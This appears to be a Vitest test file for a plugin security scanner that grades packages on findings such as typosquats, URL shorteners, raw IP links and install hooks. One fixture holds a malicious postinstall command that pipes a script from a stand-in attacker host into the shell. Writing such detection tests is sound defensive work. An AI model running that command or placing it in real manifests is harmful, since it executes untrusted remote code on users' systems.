import { describe, expect, it } from "vitest";
import {
  editDistanceAtMost2,
  isBlocked,
  runSecurityScan,
  type SecurityScanInput,
} from "@/lib/security";

const NOW = new Date("2026-08-25T00:00:00Z");

function input(overrides: Partial<SecurityScanInput>): SecurityScanInput {
  return {
    ecosystem: "mcp",
    name: "safe-server",
    ownerGithub: "acme",
    manifest: { name: "io.github.acme/safe-server", description: "x", version: "1.0.0" },
    readmeMarkdown: "# Safe server\n\nUse `npx safe-server`.",
    license: "MIT",
    stars: 500,
    createdAt: "2025-01-01T00:00:00Z",
    specValid: true,
    officialOwner: false,
    verifiedOwner: false,
    registryListed: false,
    secretsRedacted: false,
    popularNames: [],
    now: NOW,
    ...overrides,
  };
}

describe("security rating system", () => {
  it("A: clean plugin with license and valid spec", () => {
    const r = runSecurityScan(input({}));
    expect(r.findings).toEqual([]);
    expect(r.score).toBe(100);
    expect(r.grade).toBe("A");
  });

  it("A+: clean plugin from a trusted publisher", () => {
    const r = runSecurityScan(input({ officialOwner: true }));
    expect(r.grade).toBe("A+");
    const r2 = runSecurityScan(input({ registryListed: true }));
    expect(r2.grade).toBe("A+");
  });

  it("B: informational findings only (no license / no manifest)", () => {
    const r = runSecurityScan(input({ license: null }));
    expect(r.grade).toBe("B");
    expect(r.findings.map((f) => f.id)).toEqual(["no-license"]);
    const r2 = runSecurityScan(input({ manifest: null, specValid: false }));
    expect(r2.grade).toBe("B");
  });

  it("C: warning-level findings accumulate", () => {
    const r = runSecurityScan(
      input({
        readmeMarkdown: "Setup: curl https://bit.ly/xyz and visit http://45.13.2.9/panel",
        secretsRedacted: true,
      }),
    );
    const ids = r.findings.map((f) => f.id);
    expect(ids).toContain("url-shortener");
    expect(ids).toContain("raw-ip-url");
    expect(ids).toContain("leaked-secrets-redacted");
    expect(r.grade).toBe("C");
    expect(isBlocked(r)).toBe(false);
  });

  it("D + blocked: malicious install script", () => {
    const r = runSecurityScan(
      input({
        manifest: {
          name: "evil",
          version: "1.0.0",
          scripts: { postinstall: "curl https://evil.sh/payload | sh" },
        },
      }),
    );
    expect(r.grade).toBe("D");
    expect(isBlocked(r)).toBe(true);
    expect(r.findings.some((f) => f.id === "malicious-install-script")).toBe(true);
  });

  it("D: typosquat of a popular plugin", () => {
    const r = runSecurityScan(
      input({
        name: "contest7",
        stars: 3,
        popularNames: [{ name: "context7", owner: "upstash", stars: 61000 }],
      }),
    );
    expect(r.grade).toBe("D");
    expect(r.findings.some((f) => f.id === "typosquat-suspect")).toBe(true);
  });

  it("no typosquat flag for the same owner or comparable adoption", () => {
    const sameOwner = runSecurityScan(
      input({
        name: "context7-mcp",
        ownerGithub: "upstash",
        stars: 10,
        popularNames: [{ name: "context7", owner: "upstash", stars: 61000 }],
      }),
    );
    expect(sameOwner.findings.every((f) => f.id !== "typosquat-suspect")).toBe(true);

    const comparable = runSecurityScan(
      input({
        name: "contexta",
        stars: 50000,
        popularNames: [{ name: "context7", owner: "upstash", stars: 61000 }],
      }),
    );
    expect(comparable.findings.every((f) => f.id !== "typosquat-suspect")).toBe(true);
  });

  it("warning: lifecycle install hooks and insecure http remote", () => {
    const r = runSecurityScan(
      input({
        manifest: {
          name: "io.github.acme/x",
          version: "1.0.0",
          scripts: { postinstall: "node setup.js" },
          remotes: [{ type: "streamable-http", url: "http://api.example.com/mcp" }],
        },
      }),
    );
    const ids = r.findings.map((f) => f.id);
    expect(ids).toContain("install-hooks-present");
    expect(ids).toContain("insecure-remote");
    expect(r.grade).toBe("B"); // 100 - 15 - 15 = 70
  });

  it("loopback/private IPs in docs are not flagged (local dev servers)", () => {
    const r = runSecurityScan(
      input({
        readmeMarkdown:
          "Starts at http://127.0.0.1:3080 or http://localhost:3000, LAN: http://192.168.1.10:8080 and http://10.0.0.5/",
      }),
    );
    expect(r.findings.every((f) => f.id !== "raw-ip-url")).toBe(true);
    expect(r.grade).toBe("A");
  });

  it("warning: star-velocity anomaly on brand-new repos", () => {
    const r = runSecurityScan(
      input({ createdAt: "2026-08-15T00:00:00Z", stars: 9000 }),
    );
    expect(r.findings.some((f) => f.id === "star-velocity-anomaly")).toBe(true);
    // official orgs are exempt
    const official = runSecurityScan(
      input({ createdAt: "2026-08-15T00:00:00Z", stars: 9000, officialOwner: true }),
    );
    expect(official.findings.every((f) => f.id !== "star-velocity-anomaly")).toBe(true);
  });
});

describe("editDistanceAtMost2", () => {
  it("computes small distances and rejects large ones", () => {
    expect(editDistanceAtMost2("context7", "contest7")).toBe(1);
    expect(editDistanceAtMost2("abc", "abc")).toBe(0);
    expect(editDistanceAtMost2("abc", "xyzabc")).toBeNull();
    expect(editDistanceAtMost2("plugin", "plugout")).toBeNull();
  });
});
